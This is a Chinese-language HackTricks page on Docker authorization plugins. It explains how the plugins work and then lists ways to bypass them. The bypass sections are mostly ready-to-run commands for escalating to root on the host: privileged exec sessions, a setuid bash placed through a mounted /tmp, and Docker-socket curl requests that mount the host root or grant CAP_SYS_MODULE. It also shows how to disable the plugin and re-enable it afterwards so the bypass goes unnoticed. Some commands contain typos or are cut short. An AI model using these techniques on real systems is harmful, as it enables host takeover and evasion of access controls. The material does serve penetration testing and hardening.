{{#include ../../../banners/hacktricks-training.md}}

**Docker** 的开箱即用 **授权** 模型是 **全有或全无**。任何有权限访问 Docker 守护进程的用户都可以 **运行任何** Docker 客户端 **命令**。使用 Docker 的引擎 API 联系守护进程的调用者也是如此。如果您需要 **更严格的访问控制**，可以创建 **授权插件** 并将其添加到 Docker 守护进程配置中。使用授权插件，Docker 管理员可以 **配置细粒度访问** 策略来管理对 Docker 守护进程的访问。

# 基本架构

Docker Auth 插件是 **外部** **插件**，您可以使用它们来 **允许/拒绝** 请求到 Docker 守护进程的 **操作**，具体取决于请求的 **用户** 和 **请求的操作**。

**[以下信息来自文档](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

当通过 CLI 或引擎 API 向 Docker **守护进程** 发出 **HTTP** **请求** 时，**身份验证** **子系统** 会将请求传递给已安装的 **身份验证** **插件**。请求包含用户（调用者）和命令上下文。**插件** 负责决定是否 **允许** 或 **拒绝** 请求。

下面的序列图描绘了允许和拒绝的授权流程：

![Authorization Allow flow](https://docs.docker.com/engine/extend/images/authz_allow.png)

![Authorization Deny flow](https://docs.docker.com/engine/extend/images/authz_deny.png)

每个发送到插件的请求 **包括经过身份验证的用户、HTTP 头和请求/响应体**。只有 **用户名** 和 **使用的身份验证方法** 被传递给插件。最重要的是，**不** 会传递用户 **凭据** 或令牌。最后，**并非所有请求/响应体都会发送** 到授权插件。只有那些 `Content-Type` 为 `text/*` 或 `application/json` 的请求/响应体会被发送。

对于可能劫持 HTTP 连接的命令（`HTTP Upgrade`），如 `exec`，授权插件仅在初始 HTTP 请求时被调用。一旦插件批准命令，后续流程不再应用授权。具体来说，流数据不会传递给授权插件。对于返回分块 HTTP 响应的命令，如 `logs` 和 `events`，仅发送 HTTP 请求到授权插件。

在请求/响应处理期间，一些授权流程可能需要对 Docker 守护进程进行额外查询。为了完成这些流程，插件可以像普通用户一样调用守护进程 API。为了启用这些额外查询，插件必须提供管理员配置适当身份验证和安全策略的手段。

## 多个插件

您负责将 **插件** 注册为 Docker 守护进程 **启动** 的一部分。您可以安装 **多个插件并将它们链接在一起**。这个链可以是有序的。每个请求按顺序通过链传递。只有当 **所有插件都授予访问** 资源时，访问才会被授予。

# 插件示例

## Twistlock AuthZ Broker

插件 [**authz**](https://github.com/twistlock/authz) 允许您创建一个简单的 **JSON** 文件，插件将 **读取** 该文件以授权请求。因此，它为您提供了非常简单的机会来控制哪些 API 端点可以到达每个用户。

这是一个示例，允许 Alice 和 Bob 创建新容器：`{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

在页面 [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) 中，您可以找到请求的 URL 与操作之间的关系。在页面 [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) 中，您可以找到操作名称与操作之间的关系。

## 简单插件教程

您可以在这里找到一个 **易于理解的插件**，其中包含有关安装和调试的详细信息：[**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

阅读 `README` 和 `plugin.go` 代码以了解其工作原理。

# Docker Auth 插件绕过

## 枚举访问

主要检查的内容是 **哪些端点被允许** 和 **哪些 HostConfig 值被允许**。

要执行此枚举，您可以 **使用工具** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**

## 不允许的 `run --privileged`

### 最小权限
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### 运行容器并获得特权会话

在这种情况下，系统管理员**不允许用户挂载卷并使用 `--privileged` 标志运行容器**或给予容器任何额外的能力：
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
然而，用户可以**在运行中的容器内创建一个 shell 并赋予其额外的权限**：
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
现在，用户可以使用任何[**之前讨论过的技术**](./#privileged-flag)从容器中逃逸并在主机内部**提升权限**。

## 挂载可写文件夹

在这种情况下，系统管理员**不允许用户使用`--privileged`标志运行容器**或给予容器任何额外的能力，他只允许挂载`/tmp`文件夹：
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
> [!NOTE]
> 请注意，您可能无法挂载文件夹 `/tmp`，但您可以挂载一个 **不同的可写文件夹**。您可以使用以下命令查找可写目录： `find / -writable -type d 2>/dev/null`
>
> **请注意，并非所有 Linux 机器上的目录都支持 suid 位！** 要检查哪些目录支持 suid 位，请运行 `mount | grep -v "nosuid"`。例如，通常 `/dev/shm`、`/run`、`/proc`、`/sys/fs/cgroup` 和 `/var/lib/lxcfs` 不支持 suid 位。
>
> 还要注意，如果您可以 **挂载 `/etc`** 或任何其他 **包含配置文件** 的文件夹，您可以作为 root 从 docker 容器中更改它们，以便在主机上 **滥用它们** 并提升权限（可能修改 `/etc/shadow`）

## 未检查的 API 端点

配置此插件的系统管理员的责任是控制每个用户可以执行的操作及其权限。因此，如果管理员对端点和属性采取 **黑名单** 方法，他可能会 **忘记其中一些**，这可能允许攻击者 **提升权限**。

您可以在 [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) 检查 docker API

## 未检查的 JSON 结构

### 根目录中的绑定

可能在系统管理员配置 docker 防火墙时，他 **忘记了一些重要参数**，例如 [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) 中的 "**Binds**"。\
在以下示例中，可以利用此错误配置创建并运行一个挂载主机根目录（/）的容器：
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
> [!WARNING]
> 注意在这个例子中，我们将 **`Binds`** 参数作为 JSON 的根级键使用，但在 API 中它出现在 **`HostConfig`** 键下。

### HostConfig 中的 Binds

按照与 **根中的 Binds** 相同的指示，向 Docker API 发送此 **请求**：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts in root

按照与 **Binds in root** 相同的指示，向 Docker API 执行此 **request**：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

按照与 **Binds in root** 相同的指示，向 Docker API 执行此 **request**：
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## 未检查的 JSON 属性

系统管理员在配置 docker 防火墙时，**可能忘记了某个参数的重要属性**，例如 [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) 中的 "**Capabilities**" 在 "**HostConfig**" 内。以下示例中，可以利用此错误配置创建并运行具有 **SYS_MODULE** 能力的容器：
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
> [!NOTE]
> **`HostConfig`** 通常是包含 **有趣的** **权限** 以逃离容器的关键。然而，正如我们之前讨论的，注意在外部使用 Binds 也有效，并可能允许您绕过限制。

## 禁用插件

如果 **sysadmin** **忘记** **禁止** 禁用 **插件** 的能力，您可以利用这一点完全禁用它！
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
记得在提升权限后**重新启用插件**，否则**重启docker服务将无效**！

## Auth插件绕过写作

- [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

{{#include ../../../banners/hacktricks-training.md}}
